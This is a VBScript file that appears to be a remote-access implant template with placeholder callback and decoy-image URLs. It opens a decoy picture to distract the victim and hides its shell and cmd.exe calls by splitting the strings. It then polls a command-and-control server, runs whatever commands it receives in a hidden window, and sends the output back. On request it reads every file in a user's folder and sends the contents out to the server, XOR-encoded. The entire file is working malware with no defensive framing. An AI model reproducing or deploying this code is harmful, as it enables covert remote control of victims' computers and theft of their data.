On Error Resume Next
Dim fso
Set fso = CreateObject("Scripting.FileSystemObject")
Dim tmpFolder 
tmpFolder = fso.GetSpecialFolder(2)
CONST callbackUrl = "%CALLBACK_URL%"

Set oS = CreateObject ("WSc" & "ript." & "Sh" & "ell")

Dim downloadSucceeded
downloadSucceeded = DownloadFile("%JPG_URL%","%JPG_OUTPUT_NAME%")

If downloadSucceeded Then
    oS.run "c" & "md.e" & "xe /C start "" "" " & tmpFolder & "\%JPG_OUTPUT_NAME% & timeout 1", 0, True
End If


Dim xmlHttpReq, s, coutput, abc, break, re, friendly_name, encrData, exfdata, folderPath,dteWait

Set xmlHttpReq = CreateObject("MSXML2.ServerXMLHTTP")
xmlHttpReq.Open "GET", callbackUrl & "/REGISTER_VBS", false
xmlHttpReq.Send()

friendly_name = Trim(xmlHttpReq.responseText)

break = False

While break <> True
    Set xmlHttpReq = CreateObject("MSXML2.ServerXMLHTTP")
    xmlHttpReq.Open "GET", callbackUrl & "/s/VBSSIGNATURE:" & friendly_name & ":", false
    xmlHttpReq.SetTimeouts 5000, 5000, 5000, 5000
    xmlHttpReq.Send

    coutput = Trim(xmlHttpReq.responseText)


    If coutput = "NOP"  Then
        'do nothing
    ElseIf coutput = "EXIT" Then
        break = True
    ElseIf coutput = "EXFILTRATE" Then
        folderPath = "C:\Users\timtr\Documents\vbstemp"
        exfdata = ""
        exfdata = GetExfData(folderPath)
        Post(exfdata)
    Else
        abc = "c" & "m" & "d /c " & coutput & " > " &  tmpFolder & "\\o.txt"
        oS.run abc,0,True
		
		re = ""
		
		With CreateObject("Scripting.FileSystemObject")
			
			re = .OpenTextFile(tmpFolder & "\\o.txt").ReadAll()
			'.DeleteFile tmpFolder & "\\o.txt"
		End With
        Post(re)
    End If
Wend



Function GetExfData(path)
    Dim fileContent
    Set fso = CreateObject("Scripting.FileSystemObject")
            ' Get the folder object
    Set folder = fso.GetFolder(path)
    Dim abspath
    For Each subfolder In folder.SubFolders
        
        abspath = path & "\" & subfolder.Name 
        exfdata = exfdata & "EXF~t~d~" & abspath & "~"
        exfdata = exfdata & GetExfData(abspath)
    Next
    For Each file In folder.Files
        abspath = path & "\" & file.Name 
        fileContent = ""
        exfdata = exfdata & "EXF~t~f~" & abspath & "~"
        fileContent = fso.OpenTextFile(file.Path, 1).ReadAll  ' 1 = ForReading
        exfdata = exfdata & fileContent
    Next
    GetExfData = exfdata
End Function

Function Post(data)
    Dim utf8ByteArray,utf8String
    encrData = GetEncData(data, ".*!") ' Encrypt the data using your XOR function
     ' Convert the encrypted data to a UTF-8 byte array
    Set xmlHttpReq = CreateObject("MSXML2.ServerXMLHTTP")
    xmlHttpReq.Open "POST", callbackUrl, False
    xmlHttpReq.Send "VBSSIGNATURE:" & friendly_name & ":" & encrData
End Function

Function GetEncData(inputText, key)
    Dim i, j, charCode, keyCode, xorResult
    Dim result

    result = ""

    ' Loop through each character in the input text
    For i = 1 To Len(inputText)
        ' Get the ASCII code of the current character in the input text
        charCode = Asc(Mid(inputText, i, 1))
        
        ' Get the ASCII code of the corresponding character in the key (cycled)
        j = ((i - 1) Mod Len(key)) + 1
        keyCode = Asc(Mid(key, j, 1))
        
        ' XOR the character code with the key code
        xorResult = charCode Xor keyCode
        
        ' Append the result as a character to the output text
        result = result & Chr(xorResult)
    Next

    GetEncData = result
End Function



Function DownloadFile(url, output_name)
    Dim fileStream, downloadedFilePath
    downloadedFilePath = tmpFolder & "\" & output_name 
    Set xmlHttpReq = CreateObject("MSXML2.ServerXMLHTTP")
    xmlHttpReq.Open "GET", url, False
    xmlHttpReq.Send

    Do While xmlHttpReq.readyState <> 4
        WScript.Sleep 10  ' Wait 50 milliseconds before checking again
    Loop

    If xmlHttpReq.Status = 200 Then
        ' Create a binary file to save the response data
        Set fileStream = CreateObject("ADODB.Stream")
        fileStream.Type = 1  ' 1 = adTypeBinary
        fileStream.Open
        fileStream.Write xmlHttpReq.ResponseBody
        fileStream.SaveToFile downloadedFilePath, 2 ' 2 = adSaveCreateOverWrite
        fileStream.Close
        Set fileStream = Nothing
        DownloadFile = True
    Else
        DownloadFile = False
    End If
End Function